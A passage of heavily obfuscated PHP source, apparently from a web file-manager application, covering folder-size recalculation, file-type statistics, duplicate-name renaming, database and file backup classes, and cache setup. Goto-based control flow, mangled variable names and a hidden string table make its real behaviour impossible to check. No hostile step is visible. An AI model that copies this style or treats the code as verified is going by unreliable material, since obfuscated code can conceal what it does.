array($FÔ­¡Åº§Ğ[365] => array($FÔ­¡Åº§Ğ[380], $BÖ¥ø¦´º)); if ($BÇÙÏ´ÀŞ• < 0) { $f®ÓƒçÛóÁ[$FÔ­¡Åº§Ğ[77]] = array($FÔ­¡Åº§Ğ[919], abs($BÇÙÏ´ÀŞ•)); } $this->where($f®ÓƒçÛóÁ)->setAdd($FÔ­¡Åº§Ğ[77], $BÇÙÏ´ÀŞ•); } $this->targetSpaceUpdate($D¸Íäö÷„Å[$FÔ­¡Åº§Ğ[367]], $D¸Íäö÷„Å[$FÔ­¡Åº§Ğ[452]]); goto d¹‹ˆòÇé; bØ¾«†‹‡ƒ: $FÔ­¡Åº§Ğ =& $_SERVER[»„]; if ($this->statusIgnoreResetSpace) { return; } $dº¢ñ˜Ì = $FÔ­¡Åº§Ğ[2321] . $BŒåÅÏÁáõ; goto fÂ„ğ¾Ü×¬; e°É»¡éƒ: $f®ÓƒçÛóÁ = array($FÔ­¡Åº§Ğ[364] => $BŒåÅÏÁáõ, $FÔ­¡Åº§Ğ[392] => 0); $eéÂ¥ÅÙê· = $this->where($f®ÓƒçÛóÁ)->sum($FÔ­¡Åº§Ğ[77]); $eéÂ¥ÅÙê· = intval($eéÂ¥ÅÙê·); goto EŒÇÙ†¤áô; EŒÇÙ†¤áô: $BÇÙÏ´ÀŞ• = $eéÂ¥ÅÙê· - intval($D¸Íäö÷„Å[$FÔ­¡Åº§Ğ[77]]); if ($BÇÙÏ´ÀŞ• == 0) { return CacheLock::unlock($dº¢ñ˜Ì); } $this->where(array($FÔ­¡Åº§Ğ[379] => $BŒåÅÏÁáõ))->setField($FÔ­¡Åº§Ğ[77], $eéÂ¥ÅÙê·); goto cÓñß±ÚÚ; d¹‹ˆòÇé: CacheLock::unlock($dº¢ñ˜Ì); goto D“ÃÅÁã¸”; D“ÃÅÁã¸”: } public function folderSizeResetChildren($d¶Â¦Ûéè) { goto f¹¶Ü„äÑ¾; Bù–ƒÑ±›¾: foreach ($Eƒ¨ŞÒÕ¯ß as $Eîßâ£¯Æ) { if ($Eîßâ£¯Æ[$eÒÛŒõîÉœ[77]] == $Eîßâ£¯Æ[$eÒÛŒõîÉœ[2323]]) { continue; } $a‡Š´­ĞÂ§[] = array($eÒÛŒõîÉœ[365], $Eîßâ£¯Æ[$eÒÛŒõîÉœ[365]], $eÒÛŒõîÉœ[77], $Eîßâ£¯Æ[$eÒÛŒõîÉœ[77]]); } $this->saveAll($a‡Š´­ĞÂ§); goto AœâÙ“•; f¹¶Ü„äÑ¾: $eÒÛŒõîÉœ =& $_SERVER[»„]; $this->sourceCacheClear($d¶Â¦Ûéè); $E¡«£Ãô¶ç = $this->sourceInfo($d¶Â¦Ûéè); goto A“Ü°œ¢ª; A“Ü°œ¢ª: $aàÙäíÌÑ„ = array($eÒÛŒõîÉœ[514] => 1, $eÒÛŒõîÉœ[521] => array($eÒÛŒõîÉœ[479], $E¡«£Ãô¶ç[$eÒÛŒõîÉœ[455]] . $d¶Â¦Ûéè . $eÒÛŒõîÉœ[480])); $cè©«óŒ¦º = $eÒÛŒõîÉœ[2322]; $Eƒ¨ŞÒÕ¯ß = $this->field($cè©«óŒ¦º)->where($aàÙäíÌÑ„)->select(); goto Bâ¾Æáºø; Bâ¾Æáºø: $aàÙäíÌÑ„[$eÒÛŒõîÉœ[366]] = 0; $DíáäŸËÈ° = $this->field($cè©«óŒ¦º)->where($aàÙäíÌÑ„)->select(); if (!$DíáäŸËÈ°) { return; } goto D³‹É‚Â÷…; fÃ·ƒ¶óÆÇ: foreach ($DíáäŸËÈ° as $Eîßâ£¯Æ) { $AŞ»ßØ–†Ü = $Eîßâ£¯Æ[$eÒÛŒõîÉœ[457]] . $eÒÛŒõîÉœ[33]; if (!isset($Eƒ¨ŞÒÕ¯ß[$AŞ»ßØ–†Ü])) { continue; } if ($Eîßâ£¯Æ[$eÒÛŒõîÉœ[393]] == $Eƒ¨ŞÒÕ¯ß[$AŞ»ßØ–†Ü][$eÒÛŒõîÉœ[393]]) { $Eƒ¨ŞÒÕ¯ß[$AŞ»ßØ–†Ü][$eÒÛŒõîÉœ[77]] += $Eîßâ£¯Æ[$eÒÛŒõîÉœ[77]]; } } foreach ($Eƒ¨ŞÒÕ¯ß as $Eîßâ£¯Æ) { $dÎˆÊ¸†Ã = $this->parentLevelArray($Eîßâ£¯Æ[$eÒÛŒõîÉœ[455]]); foreach ($dÎˆÊ¸†Ã as $AŞ»ßØ–†Ü) { $AŞ»ßØ–†Ü = $AŞ»ßØ–†Ü . $eÒÛŒõîÉœ[33]; if (!isset($Eƒ¨ŞÒÕ¯ß[$AŞ»ßØ–†Ü])) { continue; } if ($Eîßâ£¯Æ[$eÒÛŒõîÉœ[393]] == $Eƒ¨ŞÒÕ¯ß[$AŞ»ßØ–†Ü][$eÒÛŒõîÉœ[393]]) { $Eƒ¨ŞÒÕ¯ß[$AŞ»ßØ–†Ü][$eÒÛŒõîÉœ[77]] += $Eîßâ£¯Æ[$eÒÛŒõîÉœ[77]]; } } } $a‡Š´­ĞÂ§ = array(); goto Bù–ƒÑ±›¾; D³‹É‚Â÷…: $Eƒ¨ŞÒÕ¯ß[] = $E¡«£Ãô¶ç; $Eƒ¨ŞÒÕ¯ß = array_to_keyvalue($Eƒ¨ŞÒÕ¯ß, $eÒÛŒõîÉœ[365]); foreach ($Eƒ¨ŞÒÕ¯ß as $dóî¥ùÆ›§ => $Eîßâ£¯Æ) { $Eƒ¨ŞÒÕ¯ß[$dóî¥ùÆ›§][$eÒÛŒõîÉœ[2323]] = $Eƒ¨ŞÒÕ¯ß[$dóî¥ùÆ›§][$eÒÛŒõîÉœ[77]]; $Eƒ¨ŞÒÕ¯ß[$dóî¥ùÆ›§][$eÒÛŒõîÉœ[77]] = 0; } goto fÃ·ƒ¶óÆÇ; AœâÙ“•: } public function userSpaceReset($dÅ“œ¾ì = false) { $b‡¯×¬§µ =& $_SERVER[»„]; $eøîìÌ“¢Ö = $this->where(array($b‡¯×¬§µ[367] => self::TYPE_USER, $b‡¯×¬§µ[452] => $dÅ“œ¾ì, $b‡¯×¬§µ[366] => 0))->sum($b‡¯×¬§µ[77]); Model($b‡¯×¬§µ[470])->userEdit($dÅ“œ¾ì, array($b‡¯×¬§µ[2058] => $eøîìÌ“¢Ö)); } public function targetSpaceUpdate($FëŠí˜´Î, $DË–†·ùÅ) { $C©™‹È¨çƒ =& $_SERVER[»„]; if (!$DË–†·ùÅ) { return; } if (!in_array($FëŠí˜´Î, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $BÜ™ÍóğÂˆ = $this->targetSpaceSize($FëŠí˜´Î, $DË–†·ùÅ); if ($FëŠí˜´Î == self::TYPE_USER) { Model($C©™‹È¨çƒ[470])->userEdit($DË–†·ùÅ, array($C©™‹È¨çƒ[2058] => $BÜ™ÍóğÂˆ)); } else { if ($FëŠí˜´Î == self::TYPE_GROUP) { Model($C©™‹È¨çƒ[454])->groupEdit($DË–†·ùÅ, array($C©™‹È¨çƒ[2058] => $BÜ™ÍóğÂˆ)); } } } public function targetSpaceSize($FÏâí«­“, $AÈ çê­¬ß) { goto eªÜêòšñé; ağÔ‡œ°à: return $dŒ‚‹›¦±Ó; goto cÊºˆÚÀÇ; D­Ì¿¹Ô¡: $dŒ‚‹›¦±Ó = floatval($CƒŒÎ Ş³[$E¹‹İâŠä[77]]); $A£ˆ¹¾Â® = array($E¹‹İâŠä[521] => array($E¹‹İâŠä[479], $E¹‹İâŠä[466] . $CƒŒÎ Ş³[$E¹‹İâŠä[365]] . $E¹‹İâŠä[480])); $b“Á·¶”ƒù = Model($E¹‹İâŠä[391])->field($E¹‹İâŠä[379])->where($A£ˆ¹¾Â®)->select(); goto CÉ¿Ç†’ˆ; eªÜêòšñé: $E¹‹İâŠä =& $_SERVER[»„]; $CƒŒÎ Ş³ = $this->sourceRoot($FÏâí«­“, $AÈ çê­¬ß, !0); if (!$CƒŒÎ Ş³) { return 0; } goto D­Ì¿¹Ô¡; CÉ¿Ç†’ˆ: $b“Á·¶”ƒù = array_to_keyvalue($b“Á·¶”ƒù, $E¹‹İâŠä[33], $E¹‹İâŠä[365]); $b“Á·¶”ƒù = array_unique(array_filter($b“Á·¶”ƒù)); if ($b“Á·¶”ƒù) { $A£ˆ¹¾Â® = array($E¹‹İâŠä[379] => array($E¹‹İâŠä[380], $b“Á·¶”ƒù)); $dŒ‚‹›¦±Ó += floatval($this->where($A£ˆ¹¾Â®)->sum($E¹‹İâŠä[77])); } goto ağÔ‡œ°à; cÊºˆÚÀÇ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($d‚Ê°ƒà¿ß) { return $this->fileTypeProfile($d‚Ê°ƒà¿ß, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eİæïçÃÄº) { return $this->fileTypeProfile($eİæïçÃÄº, SourceModel::TYPE_GROUP); } private function fileTypeProfile($dáèôÇˆ’Ö, $D­…ù®´Ù) { goto D¸Øà¿éÛñ; D¸Øà¿éÛñ: $eš‚ª†÷÷– =& $_SERVER[»„]; $bÁŸ°Êæ¸ = $eš‚ª†÷÷–[2324] . $dáèôÇˆ’Ö . $eš‚ª†÷÷–[70] . $D­…ù®´Ù; $cĞ¡ô°É ë = Cache::get($bÁŸ°Êæ¸); goto C‘¬˜ª¶Ä¸; A¿¶ÕÒµÚä: $c²ÅÛŸ®Ÿ = array(); $c²ÅÛŸ®Ÿ[$eš‚ª†÷÷–[2325]] = array($eš‚ª†÷÷–[2326] => LNG($eš‚ª†÷÷–[2325]), $eš‚ª†÷÷–[2327] => $this->where($FÛµ³Œ§)->count(), $eš‚ª†÷÷–[516] => $this->where($FÛµ³Œ§)->sum($eš‚ª†÷÷–[77])); $aİ˜š§óŸâ = KodIO::fileTypeList(); goto aïÀŠäÃŸ; C‘¬˜ª¶Ä¸: if ($cĞ¡ô°É ë) { return $cĞ¡ô°É ë; } $FÛµ³Œ§ = array($eš‚ª†÷÷–[514] => 0); if ($dáèôÇˆ’Ö != !1) { $FÛµ³Œ§[$eš‚ª†÷÷–[452]] = $dáèôÇˆ’Ö; $FÛµ³Œ§[$eš‚ª†÷÷–[367]] = $D­…ù®´Ù; } goto A¿¶ÕÒµÚä; aïÀŠäÃŸ: foreach ($aİ˜š§óŸâ as $eÒè÷í‘ó => $e™ÈÛÕğ˜) { $FÛµ³Œ§[$eš‚ª†÷÷–[368]] = $this->fileTypeWhere($eÒè÷í‘ó); $c²ÅÛŸ®Ÿ[$eÒè÷í‘ó] = array($eš‚ª†÷÷–[2326] => $e™ÈÛÕğ˜[$eš‚ª†÷÷–[28]], $eš‚ª†÷÷–[2327] => $this->where($FÛµ³Œ§)->count(), $eš‚ª†÷÷–[516] => $this->where($FÛµ³Œ§)->sum($eš‚ª†÷÷–[77])); } Cache::set($bÁŸ°Êæ¸, $c²ÅÛŸ®Ÿ, 1200); return $c²ÅÛŸ®Ÿ; goto c–ìæÀ‚Ëö; c–ìæÀ‚Ëö: } public function fileNameExist($FÆÊì¦çîµ, $aÃˆË»À½Ê) { $Fàøˆ³œ‡ô =& $_SERVER[»„]; $A‚ˆ’öÓ¼œ = $this->childList($FÆÊì¦çîµ); foreach ($A‚ˆ’öÓ¼œ as $F‹ˆÄŠ‘„«) { if ($F‹ˆÄŠ‘„«[$Fàøˆ³œ‡ô[28]] == $aÃˆË»À½Ê) { return $F‹ˆÄŠ‘„«[$Fàøˆ³œ‡ô[365]]; } } return !1; } public function childList($B•„™ÔİÑ) { goto bÒ¦Ÿ®òĞ; bÒ¦Ÿ®òĞ: $D•¥ÑŠºÀ =& $_SERVER[»„]; $EÆ”ŠÏ‹ = $D•¥ÑŠºÀ[2305] . $B•„™ÔİÑ; if (isset(self::$cacheChildList[$EÆ”ŠÏ‹])) { return self::$cacheChildList[$EÆ”ŠÏ‹]; } goto aÁğ‘²ã‚; aÁğ‘²ã‚: $E¬Œµ°¨„ = array($D•¥ÑŠºÀ[457] => intval($B•„™ÔİÑ), $D•¥ÑŠºÀ[393] => 0); $B§ÊµÚ¼Î = $this->where($E¬Œµ°¨„)->select(); $B§ÊµÚ¼Î = $B§ÊµÚ¼Î ? $B§ÊµÚ¼Î : array(); goto c“‰ô¥ù¤; c“‰ô¥ù¤: self::$cacheChildList[$EÆ”ŠÏ‹] = $B§ÊµÚ¼Î; foreach ($B§ÊµÚ¼Î as $aÎÆ…Šå¶) { $EÆ”ŠÏ‹ = $D•¥ÑŠºÀ[406] . $aÎÆ…Šå¶[$D•¥ÑŠºÀ[365]]; self::$cacheSourceInfo[$EÆ”ŠÏ‹] = $aÎÆ…Šå¶; } return $B§ÊµÚ¼Î; goto DÏ‡âèÚ‘„; DÏ‡âèÚ‘„: } public function fileNameAuto($eÊ…Ë¹œ…, $C¥Ã¥µÕ²Ó, $céÛÊ¼Í‘Ú = REPEAT_RENAME, $cåô÷¸Œ¬ = false) { $bê¶îÍ =& $_SERVER[»„]; $d§ŠÀ¦¢á = $this->childList($eÊ…Ë¹œ…); $aÑ³•‚ù·› = array_to_keyvalue($d§ŠÀ¦¢á, $bê¶îÍ[33], $bê¶îÍ[28]); return $this->fileNameAutoGet($aÑ³•‚ù·›, $C¥Ã¥µÕ²Ó, $céÛÊ¼Í‘Ú, $cåô÷¸Œ¬); } public function fileNameAutoGet($a™àÕÅÄÛô, $FÜ´¤¾Ë ¼, $d‹÷†èÂø‚, $AÆ†¿¨ï‹) { $F™Ÿ•Œò›Œ =& $_SERVER[»„]; if ($d‹÷†èÂø‚ == REPEAT_REPLACE || !$a™àÕÅÄÛô || !in_array_not_case($FÜ´¤¾Ë ¼, $a™àÕÅÄÛô) || $AÆ†¿¨ï‹ && $d‹÷†èÂø‚ != REPEAT_RENAME_FOLDER) { return $FÜ´¤¾Ë ¼; } if ($d‹÷†èÂø‚ == REPEAT_SKIP) { return !1; } $AßêİøÜŒ = $F™Ÿ•Œò›Œ[91] . get_path_ext($FÜ´¤¾Ë ¼); $AßêİøÜŒ = $AßêİøÜŒ == $F™Ÿ•Œò›Œ[91] || $AÆ†¿¨ï‹ ? $F™Ÿ•Œò›Œ[33] : $AßêİøÜŒ; for ($dÈŒ°‘«Ëî = 1; $dÈŒ°‘«Ëî <= count($a™àÕÅÄÛô) + 1; $dÈŒ°‘«Ëî++) { $CâÜ‘Ø“÷ = substr($FÜ´¤¾Ë ¼, 0, strlen($FÜ´¤¾Ë ¼) - strlen($AßêİøÜŒ)); $C‰òíï±ø = $CâÜ‘Ø“÷ . "\x28{$dÈŒ°‘«Ëî}\51{$AßêİøÜŒ}"; if (!in_array_not_case($C‰òíï±ø, $a™àÕÅÄÛô)) { return $C‰òíï±ø; } } } } goto dÇ„˜Œ¥¯œ; eö¤‹Ëƒæ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto f¶óó¿³¦¤; aö•ØïŸ‡Á: mk_dir($a„‰³ìˆì¼); $b»ƒ†Úæµñ = $dÈÀæ¦ÕØª->db()->getTables(); $fğçÅ†Ñ÷ğ = 0; goto EŒËÁ¦; EŒËÁ¦: $dö„ä×ê½… = new Task($aòÎÅ¹¯ß[699], $aòÎÅ¹¯ß[700], 0, LNG($aòÎÅ¹¯ß[701]) . $aòÎÅ¹¯ß[702] . LNG($aòÎÅ¹¯ß[703])); $b»ƒ†Úæµñ = array_diff($b»ƒ†Úæµñ, array($aòÎÅ¹¯ß[704], $aòÎÅ¹¯ß[705])); foreach ($b»ƒ†Úæµñ as $c‡Áİ’šŸ) { $fÀ¢«åƒÁ = $a„‰³ìˆì¼ . $c‡Áİ’šŸ . $aòÎÅ¹¯ß[706]; $C¶À†®™ô¹ = null; if ($c‡Áİ’šŸ == $aòÎÅ¹¯ß[707] && (!isset($B²¾äñê‚[$aòÎÅ¹¯ß[680]]) || $B²¾äñê‚[$aòÎÅ¹¯ß[680]] == $aòÎÅ¹¯ß[464])) { $C¶À†®™ô¹ = self::$io; } $fğçÅ†Ñ÷ğ += $dÈÀæ¦ÕØª->sqlFromDb($c‡Áİ’šŸ, $fÀ¢«åƒÁ, $dö„ä×ê½…, $C¶À†®™ô¹); } goto Bš¹é³Ó‰; f¶óó¿³¦¤: $aòÎÅ¹¯ß =& $_SERVER[»„]; $B²¾äñê‚ = Backup::get(); self::$io = $B²¾äñê‚[$aòÎÅ¹¯ß[679]]; goto FŒ¶¾À˜³Õ; FŒ¶¾À˜³Õ: self::$name = $B²¾äñê‚[$aòÎÅ¹¯ß[28]]; $BïÊ˜º¨Ø° = $GLOBALS[$aòÎÅ¹¯ß[6]][$aòÎÅ¹¯ß[17]]; $D§ÁÉñ•¢à = $this->_dbType($BïÊ˜º¨Ø°); goto Aùô¸¿Ü›–; Bš¹é³Ó‰: $dö„ä×ê½…->end(); $eÚ”Ãéôí‡ = array($aòÎÅ¹¯ß[708] => $D§ÁÉñ•¢à, $aòÎÅ¹¯ß[695] => 1, $aòÎÅ¹¯ß[709] => $fğçÅ†Ñ÷ğ, $aòÎÅ¹¯ß[710] => $fğçÅ†Ñ÷ğ); Backup::set($eÚ”Ãéôí‡); goto a’ç×’‘Íê; a’ç×’‘Íê: return !0; goto céÕĞªŒœÄ; Aùô¸¿Ü›–: $dÈÀæ¦ÕØª = new DbManage($BïÊ˜º¨Ø°, $D§ÁÉñ•¢à); $a„‰³ìˆì¼ = TEMP_FILES . $aòÎÅ¹¯ß[698] . self::$name . $aòÎÅ¹¯ß[8]; del_dir($a„‰³ìˆì¼); goto aö•ØïŸ‡Á; céÕĞªŒœÄ: } private function _dbType($a‹‹÷ö¶Åˆ) { goto cìù×éŠ¸; Dö¾ÂÕÚ»: return $a›‹„ÖêÌõ; goto BÓ‚§…; cìù×éŠ¸: $b¬‰‡×¦Œ‰ =& $_SERVER[»„]; $a‹‹÷ö¶Åˆ = array_change_key_case($a‹‹÷ö¶Åˆ); $a›‹„ÖêÌõ = $a‹‹÷ö¶Åˆ[$b¬‰‡×¦Œ‰[711]]; goto A¿‘˜Á—Ô; A¿‘˜Á—Ô: if ($a›‹„ÖêÌõ == $b¬‰‡×¦Œ‰[712]) { $BÃÃ¦°ŞĞ = explode($b¬‰‡×¦Œ‰[4], $a‹‹÷ö¶Åˆ[$b¬‰‡×¦Œ‰[713]]); $a›‹„ÖêÌõ = $BÃÃ¦°ŞĞ[0]; } $DĞğò˜¼Üì = array($b¬‰‡×¦Œ‰[714] => $b¬‰‡×¦Œ‰[9], $b¬‰‡×¦Œ‰[715] => $b¬‰‡×¦Œ‰[716]); if (isset($DĞğò˜¼Üì[$a›‹„ÖêÌõ])) { $a›‹„ÖêÌõ = $DĞğò˜¼Üì[$a›‹„ÖêÌõ]; } goto Dö¾ÂÕÚ»; BÓ‚§…: } } class BackupDbFile { public function __construct() { } public function index() { goto b²À¯‹Ó¼¯; Fƒ½•Ë§ìÓ: IO::copy($c®ÁÀÂ‚Şá, $Fé¨å„‰²ó . "\142\x61\x63\x6b\x75\x70\x5f{$D¸°¨”ê˜õ}\x2f"); $b§›‚É‘Ş”->end(); Backup::set(array($d’´Çëòˆ[721] => $EŸ­ÁÊÚò®[$d’´Çëòˆ[77]])); goto a©Î¬‚Œæ; a©Î¬‚Œæ: return !0; goto Dâ¦íÒŒã; FÆíÒªİµ„: $f©‡¾¡ÌÉŞ = TEMP_FILES . "\142\141\143\153\165\x70\137{$D¸°¨”ê˜õ}\x2f"; $Fé¨å„‰²ó = "\x7b\x69\x6f\72{$D¤‡‹Êİ©[$d’´Çëòˆ[679]]}\175\x2f\x64\141\164\141\x62\x61\x73\145\57"; IO::mkdir($Fé¨å„‰²ó . "\142\x61\143\153\165\160\x5f{$D¸°¨”ê˜õ}\57"); goto b¿ÒÀä½ª; b¿ÒÀä½ª: $b§›‚É‘Ş” = new TaskFileTransfer($d’´Çëòˆ[717], $d’´Çëòˆ[700], 0, LNG($d’´Çëòˆ[701]) . $d’´Çëòˆ[408] . LNG($d’´Çëòˆ[703]) . $d’´Çëòˆ[718]); $b§›‚É‘Ş”->addPath($f©‡¾¡ÌÉŞ); $EŸ­ÁÊÚò® = IO::infoWithChildren($f©‡¾¡ÌÉŞ); goto fíÓŞÇˆ·; fíÓŞÇˆ·: Backup::set(array($d’´Çëòˆ[719] => $EŸ­ÁÊÚò®[$d’´Çëòˆ[77]])); IO::move($f©‡¾¡ÌÉŞ, $Fé¨å„‰²ó); $c®ÁÀÂ‚Şá = CONTROLLER_DIR . $d’´Çëòˆ[720]; goto Fƒ½•Ë§ìÓ; b²À¯‹Ó¼¯: $d’´Çëòˆ =& $_SERVER[»„]; $D¤‡‹Êİ© = Backup::get(); $D¸°¨”ê˜õ = $D¤‡‹Êİ©[$d’´Çëòˆ[28]]; goto FÆíÒªİµ„; Dâ¦íÒŒã: } } class BackupFile { public function __construct() { } public function index() { goto a´õçêùëå; E‡›ƒ»è‡¤: $DêÃŞ¦†ç = (int) Model($_SERVER[»„][707])->where($C°„ù²—ñ)->count($_SERVER[»„][415]); $f´èô™Ì½ö = (int) Model($_SERVER[»„][707])->where($C°„ù²—ñ)->sum($_SERVER[»„][77]); $CïÜÅï…… = new TaskFileTransfer($_SERVER[»„][724], $_SERVER[»„][700], $DêÃŞ¦†ç, LNG($_SERVER[»„][701]) . $_SERVER[»„][702] . LNG($_SERVER[»„][725])); goto b‚ÕÛÃƒ¢; a´õçêùëå: $dÅã×Ş­ = Backup::get(); $aÎÁŞ¢„‘ß = $dÅã×Ş­[$_SERVER[»„][277]][$_SERVER[»„][163]][$_SERVER[»„][415]]; $C°„ù²—ñ = array($_SERVER[»„][416] => array($_SERVER[»„][722], $aÎÁŞ¢„‘ß), $_SERVER[»„][723] => array($_SERVER[»„][315], $dÅã×Ş­[$_SERVER[»„][679]])); goto E‡›ƒ»è‡¤; Cáš³Ù¬É÷: Backup::set($Dêóë¯ºÔĞ); $this->_fileFilter($aÔò³—Á–ñ); return !0; goto e×–ã‚²ŒŸ; BÓ½×İ”ÄÊ: $eŞ¹ÏÓª… = 1000; $bà­È‰¨ù = $A ¥âÀ¿•Á = 0; $aÔò³—Á–ñ = array(); goto D‚‚»ĞàŞ•; D‚‚»ĞàŞ•: $aí‚Ç±–ñ = $e§•¯Ç´„ç = 0; do { $eéŒšÎ·§£ = $_SERVER[»„][728]; $CÜ§“¾„… = Model($_SERVER[»„][707])->where($C°„ù²—ñ)->field($eéŒšÎ·§£)->order($_SERVER[»„][729])->selectPage($eŞ¹ÏÓª…, $Cë‹Í£î³ö); $D–¥Û†ÃÎ¦ = !empty($CÜ§“¾„…[$_SERVER[»„][350]]) ? $CÜ§“¾„…[$_SERVER[»„][350]] : array(); foreach ($D–¥Û†ÃÎ¦ as $cƒ¼·ë¦›) { goto dÀ…îªñ†Š; Cé¹•Ù«„¶: if (IO::exist($d…Ä×È÷ô§)) { $CïÜÅï……->updateFileEnd($cƒ¼·ë¦›[$_SERVER[»„][28]], $cƒ¼·ë¦›[$_SERVER[»„][77]]); } else { $d…Ä×È÷ô§ = get_path_father($d…Ä×È÷ô§); IO::mkdir($d…Ä×È÷ô§); if (!IO::copy($c¡•‡ŒŒ®©, $d…Ä×È÷ô§, $_SERVER[»„][732])) { write_log($_SERVER[»„][733] . $c¡•‡ŒŒ®© . $_SERVER[»„][734] . $d…Ä×È÷ô§ . $_SERVER[»„][472], $_SERVER[»„][700]); $F’©µ¼Ú¥„ = !1; break; } } $aÎÁŞ¢„‘ß = $cƒ¼·ë¦›[$_SERVER[»„][415]]; $A ¥âÀ¿•Á += 1; goto a“®ÑË«ÄÖ; a“®ÑË«ÄÖ: $bà­È‰¨ù += $cƒ¼·ë¦›[$_SERVER[»„][77]]; $e§•¯Ç´„ç += 1; $aí‚Ç±–ñ += $cƒ¼·ë¦›[$_SERVER[»„][77]]; goto A÷‰Ê¯³‰; dÀ…îªñ†Š: if (!$this->_fileExist($cƒ¼·ë¦›, $aÔò³—Á–ñ, $Aá¤ôÍ¯¨)) { $DêÃŞ¦†ç -= 1; $f´èô™Ì½ö -= (int) $cƒ¼·ë¦›[$_SERVER[»„][77]]; write_log("\146\151\154\145\x20\156\157\x74\x20\x65\170\151\163\x74\x2e\146\151\x6c\145\111\104\72{$cƒ¼·ë¦›[$_SERVER[»„][415]]}\x2c\40\x70\141\164\x68\x3a{$cƒ¼·ë¦›[$_SERVER[»„][75]]}", $_SERVER[»„][730]); continue; } $c¡•‡ŒŒ®© = $cƒ¼·ë¦›[$_SERVER[»„][75]]; $d…Ä×È÷ô§ = "\173\x69\157\72{$dÅã×Ş­[$_SERVER[»„][679]]}\175" . substr($c¡•‡ŒŒ®©, strlen("\173\x69\x6f\72{$cƒ¼·ë¦›[$_SERVER[»„][731]]}\175")); goto Cé¹•Ù«„¶; A÷‰Ê¯³‰: if ($bà­È‰¨ù >= 1024 * 1024 * 100) { $Dêóë¯ºÔĞ = array($_SERVER[»„][735] => $aÎÁŞ¢„‘ß, $_SERVER[»„][736] => $e§•¯Ç´„ç, $_SERVER[»„][737] => $aí‚Ç±–ñ); Backup::set($Dêóë¯ºÔĞ); $bà­È‰¨ù = $A ¥âÀ¿•Á = 0; } goto d†íè¨¹ƒ«; d†íè¨¹ƒ«: } $D®ÙÎÁµõ = count($D–¥Û†ÃÎ¦); $Cë‹Í£î³ö++; } while ($D®ÙÎÁµõ == $eŞ¹ÏÓª…); $CïÜÅï……->end(); goto b÷‘¼Ñ¸Ïï; eäø²”‚ƒà: $F’©µ¼Ú¥„ = !0; $Aá¤ôÍ¯¨ = $this->storeIds(); $Cë‹Í£î³ö = 1; goto BÓ½×İ”ÄÊ; b÷‘¼Ñ¸Ïï: $AÓ–äÇïá’ = $F’©µ¼Ú¥„ ? 1 : 0; $Dêóë¯ºÔĞ = array($_SERVER[»„][738] => 1, $_SERVER[»„][691] => time(), $_SERVER[»„][697] => $AÓ–äÇïá’, $_SERVER[»„][735] => $aÎÁŞ¢„‘ß, $_SERVER[»„][727] => $f´èô™Ì½ö, $_SERVER[»„][726] => $DêÃŞ¦†ç); if ($A ¥âÀ¿•Á) { $Dêóë¯ºÔĞ[$_SERVER[»„][736]] = $e§•¯Ç´„ç; $Dêóë¯ºÔĞ[$_SERVER[»„][737]] = $aí‚Ç±–ñ; } goto Cáš³Ù¬É÷; b‚ÕÛÃƒ¢: $CïÜÅï……->task[$_SERVER[»„][686]] = $f´èô™Ì½ö; $Dêóë¯ºÔĞ = array($_SERVER[»„][726] => $DêÃŞ¦†ç, $_SERVER[»„][727] => $f´èô™Ì½ö); Backup::set($Dêóë¯ºÔĞ); goto eäø²”‚ƒà; e×–ã‚²ŒŸ: } private function _fileExist($Aìì™¶¿ù™, &$fÛ¢ÎÆÎ¡°, $e§½˜è…Í®) { goto BÜİ¼–÷Êë; BÜİ¼–÷Êë: $e¯‘é¡’ç÷ =& $_SERVER[»„]; $fÍ‘ˆÄ¯Æ = $Aìì™¶¿ù™[$e¯‘é¡’ç÷[75]]; if (in_array($Aìì™¶¿ù™[$e¯‘é¡’ç÷[415]], $fÛ¢ÎÆÎ¡°)) { return !1; } goto Dê¨¡êÙ; C¦¿¾ì: if (IO::exist($a†“ˆæá )) { $fÛ¢ÎÆÎ¡°[] = $Aìì™¶¿ù™[$e¯‘é¡’ç÷[415]]; return !1; } $C†Œ´¡¿Ø‡ = array($e¯‘é¡’ç÷[731] => $Aìì™¶¿ù™[$e¯‘é¡’ç÷[731]], $e¯‘é¡’ç÷[75] => array($e¯‘é¡’ç÷[739], "{$a†“ˆæá }\45")); $BŒÈ®¨¿‘ô = Model($e¯‘é¡’ç÷[707])->where($C†Œ´¡¿Ø‡)->field($e¯‘é¡’ç÷[416])->select(); goto BÙõİÆ×ˆ; BÙõİÆ×ˆ: $fÛ¢ÎÆÎ¡° = array_merge($fÛ¢ÎÆÎ¡°, array_to_keyvalue($BŒÈ®¨¿‘ô, $e¯‘é¡’ç÷[33], $e¯‘é¡’ç÷[415])); return !1; goto eŞ–¹§ÑØ; Dê¨¡êÙ: if (!in_array($Aìì™¶¿ù™[$e¯‘é¡’ç÷[731]], $e§½˜è…Í®)) { return !1; } if (IO::exist($fÍ‘ˆÄ¯Æ)) { return !0; } $a†“ˆæá  = get_path_father($fÍ‘ˆÄ¯Æ); goto C¦¿¾ì; eŞ–¹§ÑØ: } private function _fileFilter($F‚ËŸÖ¡¦) { $d¤ì­èƒà =& $_SERVER[»„]; if (empty($F‚ËŸÖ¡¦)) { return; } $F¬¤¾¨Š‰ = array($d¤ì­èƒà[415] => array($d¤ì­èƒà[7], array_unique($F‚ËŸÖ¡¦))); $CÒñ×±Ï­ = Model($d¤ì­èƒà[740])->where($F¬¤¾¨Š‰)->field($d¤ì­èƒà[365])->select(); foreach ($CÒñ×±Ï­ as $Có‡•²å°Ï) { Model($d¤ì­èƒà[740])->remove($Có‡•²å°Ï[$d¤ì­èƒà[365]], !1); } } private function storeIds() { $Cô¹¸ƒ¸¼¯ =& $_SERVER[»„]; $a•‡õŒ•ù = Model($Cô¹¸ƒ¸¼¯[692])->listData(); return array_to_keyvalue($a•‡õŒ•ù, $Cô¹¸ƒ¸¼¯[33], $Cô¹¸ƒ¸¼¯[363]); } } goto aù·ÒÄ¯éß; cêÂôãà §: register_shutdown_function($_SERVER[ÓÊÌ][36]); set_error_handler($_SERVER[ÓÊÌ][49], $Eğ”Ä³Áï¬); if (function_exists($_SERVER[ÓÊÌ][50])) { set_exception_handler($_SERVER[ÓÊÌ][51]); } goto f“Š‹è´×æ; aù·ÒÄ¯éß: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto fùÅÉÜŸ±©; AÃíôö÷Â : $d–¢Ğ³‘®› = 